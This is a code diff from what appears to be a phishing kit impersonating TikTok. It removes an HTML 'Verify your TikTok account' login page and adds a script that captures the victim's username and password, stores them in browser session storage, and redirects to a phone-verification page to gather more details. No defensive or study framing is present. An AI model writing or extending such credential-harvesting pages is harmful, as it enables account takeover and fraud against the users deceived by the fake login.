@@ -1,38 +1,52 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify TikTok Account</title>
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
-    <!-- Font Awesome (for icons) -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="style.css">
-</head>
-<body>
-    <div class="login-container">
-        <div class="login-header">
-            <i class="fab fa-tiktok login-icon-platform"></i>
-            <h2>Verify your TikTok account</h2>
-            <p>Please enter your account details to proceed with verification.</p>
-        </div>
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="username"><i class="fas fa-user"></i> TikTok Username or Email:</label>
-                <input type="text" id="username" name="username" placeholder="Username or email" required>
-            </div>
-            <div class="form-group">
-                <label for="password"><i class="fas fa-lock"></i> Password:</label>
-                <input type="password" id="password" name="password" placeholder="Enter your password" required>
-            </div>
-            <button type="submit" class="btn-login">
-                Next <i class="fas fa-arrow-right"></i>
-            </button>
-        </form>
-        <div id="message" class="message"></div>
-    </div>
+// script.js (for Page 1 - index.html)
+document.addEventListener('DOMContentLoaded', function () {
+    const loginForm = document.getElementById('loginForm');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const messageDiv = document.getElementById('message');
 
-    <script src="script.js"></script>
-</body>
-</html>
+    loginForm.addEventListener('submit', function (event) {
+        event.preventDefault(); // This is KEY to prevent normal refresh
+
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value;
+
+        if (messageDiv) {
+            messageDiv.textContent = '';
+            messageDiv.className = 'message';
+            messageDiv.classList.remove('show');
+        }
+
+        if (username === '' || password === '') {
+            displayMessage('Please enter both username/email and password.', 'error');
+            return; // Stop execution if fields are empty
+        }
+
+        // If we reach here, validation passed. Now try to store and redirect.
+        try {
+            sessionStorage.setItem('tiktokUsername', username);
+            sessionStorage.setItem('tiktokPassword', password);
+
+            // Redirect to the phone number page
+            console.log("Attempting to redirect to phone_verify.html"); // For debugging
+            window.location.href = 'phone_verify.html';
+        } catch (e) {
+            // This might happen if sessionStorage is disabled or full
+            console.error("Error using sessionStorage: ", e);
+            displayMessage('Could not proceed. Please enable browser storage or try again.', 'error');
+        }
+    });
+
+    function displayMessage(msg, type) {
+        if (messageDiv) {
+            setTimeout(() => {
+                messageDiv.textContent = msg;
+                messageDiv.classList.add(type);
+                messageDiv.classList.add('show'); // For animation if you have CSS for .show
+            }, 50);
+        } else {
+            // Fallback if messageDiv doesn't exist
+            alert((type === 'error' ? "Error: " : "") + msg);
+        }
+    }
+});
